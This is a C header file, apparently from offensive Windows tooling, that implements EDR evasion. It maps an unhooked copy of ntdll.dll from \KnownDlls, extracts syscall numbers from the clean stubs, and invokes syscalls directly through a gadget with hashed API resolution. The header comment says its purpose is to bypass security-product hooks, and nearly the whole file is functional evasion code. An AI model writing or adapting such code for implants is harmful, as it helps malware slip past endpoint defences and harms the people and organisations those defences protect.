// =============================================================================
// clean_ssn.h – Evasion of API Hooking (Clean Ntdll from \KnownDlls)
// =============================================================================
// Features:
//   - Maps a fresh, unhooked copy of ntdll.dll from \KnownDlls\ntdll.dll
//   - Extracts System Service Numbers (SSN) directly from the clean image
//   - Bypasses EDR hooks placed in the process's primary ntdll instance
//   - Uses triple-hash resolution for export walking
// =============================================================================

#ifndef CLEAN_SSN_H
#define CLEAN_SSN_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "syscalls.h"

extern PVOID     g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// HELPERS
// =============================================================================

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}
#endif

// =============================================================================
// CLEAN SSN CORE
// =============================================================================

static PVOID MapCleanNtdll() {
    // 1. Path: \KnownDlls\ntdll.dll
    UNICODE_STRING ntPath;
    ntPath.Buffer = (PWSTR)L"\\KnownDlls\\ntdll.dll";
    ntPath.Length = (USHORT)(20 * sizeof(WCHAR));
    ntPath.MaximumLength = ntPath.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &ntPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // 2. Open via Syscall
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK io;
    // NtOpenFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG)
    NTSTATUS st = InvokeSyscall(g_ApiTable.syscalls.NtOpenFile.ssn, g_SyscallGadget,
        &hFile, GENERIC_READ | SYNCHRONIZE, &oa, &io, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
    
    if (st != 0) return NULL;

    // 3. Create Section
    HANDLE hSection = NULL;
    // NtCreateSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE)
    st = InvokeSyscall(g_ApiTable.syscalls.NtCreateSection.ssn, g_SyscallGadget,
        &hSection, SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    
    InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hFile);
    if (st != 0) return NULL;

    // 4. Map View
    PVOID mapped = NULL;
    SIZE_T viewSize = 0;
    // NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG)
    st = InvokeSyscall(g_ApiTable.syscalls.NtMapViewOfSection.ssn, g_SyscallGadget,
        hSection, (HANDLE)-1, &mapped, 0, 0, NULL, &viewSize, 1 /* ViewUnmap */, 0, PAGE_READONLY);
    
    InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hSection);
    if (st != 0) return NULL;

    return mapped;
}

static WORD GetCleanSSN(PVOID cleanNtdll, TRIPLE_HASH funcHash) {
    if (!cleanNtdll) return 0;

    // Use existing ResolveApiByHash but on the clean mapped base
    PVOID pFunc = ResolveApiByHash(cleanNtdll, funcHash);
    if (!pFunc) return 0;

    PBYTE stub = (PBYTE)pFunc;
    // Standard syscall stub pattern:
    // 4C 8B D1    mov r10, rcx
    // B8 XX XX 00 00 mov eax, SSN
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
        return *(WORD*)(stub + 4);
    }
    
    return 0;
}

#endif
